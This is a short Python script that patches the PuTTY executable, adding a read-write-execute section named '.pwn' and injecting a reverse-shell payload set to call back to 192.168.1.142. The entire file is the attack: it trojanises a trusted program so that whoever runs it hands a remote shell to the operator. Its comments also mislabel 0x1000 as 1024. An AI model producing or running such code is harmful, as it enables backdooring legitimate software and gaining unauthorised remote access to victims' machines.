import payload_injection
import section_injection

section_injection.add_section("./assets/bin/putty.exe",
                              ".pwn",
                              0x1000,        # Page Size 1024
                              0x1000,        # Section Size 1024
                              0xE0000000)    # permissions READ WRITE EXECUTE

payload_injection.insert_payload(
    "./assets/bin/putty_injection.exe", 'rev', lhost='192.168.1.142')
